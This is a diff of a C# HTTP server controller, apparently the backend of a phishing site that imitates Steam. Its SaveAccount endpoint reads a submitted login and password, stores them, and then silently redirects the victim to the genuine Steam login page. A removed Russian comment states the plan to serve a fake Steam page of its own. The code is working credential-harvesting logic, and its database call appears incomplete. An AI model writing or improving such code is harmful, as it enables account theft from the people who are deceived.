@@ -1,10 +1,7 @@
-﻿using System;
-using System.Net;
-using System.Security.AccessControl;
-using System.Text;
+﻿using System.Net;
+using System.Text.RegularExpressions;
 using HTTPServer.Models;
 using HTTPServer.Services;
-
 
 namespace HTTPServer.Controllers
 {
@@ -12,26 +9,40 @@ namespace HTTPServer.Controllers
     public class ApiController
     {
         //TODO: сделать обработчик параметров, передавть уже готовую модель
-        //TODO: если пароль и логин не валидны вернуть свою же страницу стим
-        //TODO: както избавиться от префиксов в rawurl зная роутинг аттрибутов
-        //TODO: изменить статус код на 303 -  see other
-        [HttpGet("save")]
-        public async Task<HttpListenerResponse?> SaveAccount(HttpListenerContext context)
+        [HttpPost("save")]
+        public async Task<HttpListenerResponse> SaveAccount(HttpListenerContext context)
         {
             var request = context.Request;
             var response = context.Response;
-            var rawUrl = request.RawUrl.Replace("%20", " ").Replace(@"/api/save", string.Empty);
-            if(HttpListenerRequestHelper.TryParse(rawUrl , out SteamAccount? account))
+            var parameters = await HttpListenerRequestHelper.GetBodyDataAsync(request);
+            if(TryParse(parameters, out SteamAccount? account))
             {
                 await DBProvider.AddAsync();
-                response.StatusCode = (int)HttpStatusCode.Redirect;
                 response.Headers.Set("Location", @"https://store.steampowered.com/login");
-                return response;
+                return response.SetStatusCode((int)HttpStatusCode.SeeOther);
             }
-            response.SetStatusCode((int)HttpStatusCode.BadRequest)
-                        .SetContentType(".txt")
-                        .Write403PageToBody();
-            return response;
+            response.Headers.Set("Location", @"/");
+            return response.SetStatusCode((int)HttpStatusCode.Redirect);
+        }
+
+        private static bool TryParse(string parameters, out SteamAccount? account)
+        {
+            //TODO: сделать в регулярке только лат символы и цифра
+            string pattern = @"login=\b(\w+?)\b&password=\b(\w+?)\b";
+            Regex rg = new Regex(pattern);
+            if (string.IsNullOrEmpty(parameters) || !rg.IsMatch(parameters))
+            {
+                account = null;
+                return false;
+            }
+            var data = parameters.Split(new[] { "/", "?", "login", "=", "password", "&" }, StringSplitOptions.RemoveEmptyEntries);
+            if (data.Length == 2)
+            {
+                account = new SteamAccount() { Login = data[0], Password = data[1] };
+                return true;
+            }
+            account = null;
+            return false;
         }
     }
 }
